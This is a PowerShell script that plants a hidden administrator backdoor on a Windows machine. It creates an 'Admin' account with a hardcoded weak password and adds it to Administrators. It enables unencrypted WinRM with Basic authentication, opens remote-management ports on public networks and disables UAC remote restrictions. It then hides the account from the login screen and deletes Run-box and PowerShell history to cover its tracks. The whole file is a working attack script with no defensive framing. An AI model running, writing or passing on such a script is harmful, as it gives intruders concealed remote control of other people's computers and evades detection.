# Create a new local user account if it doesn't exist
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force

if (-not (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires
    Write-Host "User '$Username' created."
} else {
    Write-Host "User '$Username' already exists."
}

# Add the newly created user to the local Administrators group if not already a member
if (-not (Get-LocalGroupMember -Group "Administrators" | Where-Object { $_.Name -eq $Username })) {
    Add-LocalGroupMember -Group "Administrators" -Member $Username
    Write-Host "User '$Username' added to the Administrators group."
} else {
    Write-Host "User '$Username' is already a member of the Administrators group."
}

# Enable Windows Remote Management (WinRM) to start automatically even on boot
Set-Service -Name WinRM -StartupType Automatic
Start-Service -Name WinRM

# Modify WinRM settings to work on Public networks
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}

# Manually configure firewall to allow WinRM on Public networks (for both HTTP and HTTPS)
New-NetFirewallRule -DisplayName "Allow WinRM on Public" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -Profile Public
New-NetFirewallRule -DisplayName "Allow WinRM Secure" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow -Profile Public

# Add WinRM listeners for HTTP and HTTPS (even if they don't exist)
winrm quickconfig -force
winrm create winrm/config/listener?Address=*+Transport=HTTP @{Port="5985"}
winrm create winrm/config/listener?Address=*+Transport=HTTPS @{Port="5986"}

# Disable UAC remote restrictions (needed for remote admin access)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force

# Create the registry path if it doesn't exist and add the user to the SpecialAccounts UserList (hide from login screen)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force
}
New-ItemProperty -Path $regPath -Name $Username -Value 0 -PropertyType DWORD -Force
Write-Host "User '$Username' is now hidden from the login screen."

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

# Delete PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Ensure firewall rules are persistent after reboot by configuring rules to apply on all profiles
Set-NetFirewallProfile -Profile Domain, Private, Public -Enabled True

# Change network profile to Private if Public network is detected
$networkProfile = Get-NetConnectionProfile | Where-Object {$_.NetworkCategory -eq "Public"}
if ($networkProfile) {
    Set-NetConnectionProfile -InterfaceIndex $networkProfile.InterfaceIndex -NetworkCategory Private
    Write-Host "Network profile changed to Private."
} else {
    Write-Host "No Public network profile found. Network profile is already Private or Domain."
}

# Exit PowerShell session
Write-Host "Script completed successfully."
